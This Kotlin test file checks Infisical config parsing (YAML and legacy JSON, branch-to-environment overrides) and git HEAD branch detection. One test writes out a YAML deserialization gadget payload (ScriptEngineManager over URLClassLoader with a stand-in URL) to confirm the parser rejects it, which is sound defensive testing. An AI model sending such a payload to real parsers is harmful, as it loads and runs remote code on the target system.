package cz.xprees.secrets

import cz.xprees.secrets.core.resolve.GitHead
import cz.xprees.secrets.infisical.config.InfisicalProjectConfig
import org.assertj.core.api.Assertions.assertThat
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.nio.file.Files

class InfisicalProjectConfigTest {
    @get:Rule
    val temp = TemporaryFolder()

    @Test
    fun `yaml with branch overrides and domain`() {
        val root = temp.root.toPath()
        Files.writeString(
            root.resolve(".infisical.yaml"),
            """
            version: 1
            general:
              domain: https://eu.infisical.com
            secrets-management:
              project-id: proj-123
              environment: dev
              secret-path: /backend
              overrides:
                git-branch:
                  - branch: main
                    environment: prod
                  - branch: staging
                    environment: staging
            """.trimIndent(),
        )
        val nested = Files.createDirectories(root.resolve("services/api"))
        val config = InfisicalProjectConfig.find(nested)!!
        assertThat(config.projectId).isEqualTo("proj-123")
        assertThat(config.environment).isEqualTo("dev")
        assertThat(config.secretPath).isEqualTo("/backend")
        assertThat(config.domain).isEqualTo("https://eu.infisical.com")
        assertThat(config.environmentForBranch("main")).isEqualTo("prod")
        assertThat(config.environmentForBranch("release/staging")).isEqualTo("staging")
        assertThat(config.environmentForBranch("feature/x")).isNull()
    }

    @Test
    fun `legacy json and yaml precedence per directory`() {
        val root = temp.root.toPath()
        Files.writeString(
            root.resolve(".infisical.json"),
            """{"workspaceId":"legacy","defaultEnvironment":"staging","gitBranchToEnvironmentMapping":{"main":"prod"},"domain":"ftp://bad"}""",
        )
        val json = InfisicalProjectConfig.find(root)!!
        assertThat(json.projectId).isEqualTo("legacy")
        assertThat(json.environmentForBranch("main")).isEqualTo("prod")
        assertThat(json.domain).describedAs("non-http domains are ignored, like the CLI does").isNull()

        Files.writeString(root.resolve(".infisical.yaml"), "secrets-management:\n  project-id: modern\n")
        assertThat(InfisicalProjectConfig.find(root)!!.projectId).isEqualTo("modern")
    }

    @Test
    fun `yaml tags cannot construct objects`() {
        val file = temp.newFile(".infisical.yaml").toPath()
        Files.writeString(file, "secrets-management: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x\"]]]]\n")
        assertThat(runCatching { InfisicalProjectConfig.read(file) }.getOrNull()?.projectId).isNull()
    }

    @Test
    fun `git head branch, detached head and worktree file`() {
        val repo = temp.newFolder("repo").toPath()
        Files.createDirectories(repo.resolve(".git"))
        Files.writeString(repo.resolve(".git/HEAD"), "ref: refs/heads/feature/login\n")
        assertThat(GitHead.currentBranch(Files.createDirectories(repo.resolve("a/b")))).isEqualTo("feature/login")

        Files.writeString(repo.resolve(".git/HEAD"), "4f1c0de\n")
        assertThat(GitHead.currentBranch(repo)).isNull()

        val worktree = temp.newFolder("wt").toPath()
        val gitDir = Files.createDirectories(temp.root.toPath().resolve("gitdirs/wt"))
        Files.writeString(gitDir.resolve("HEAD"), "ref: refs/heads/main\n")
        Files.writeString(worktree.resolve(".git"), "gitdir: ${gitDir}\n")
        assertThat(GitHead.currentBranch(worktree)).isEqualTo("main")
    }
}
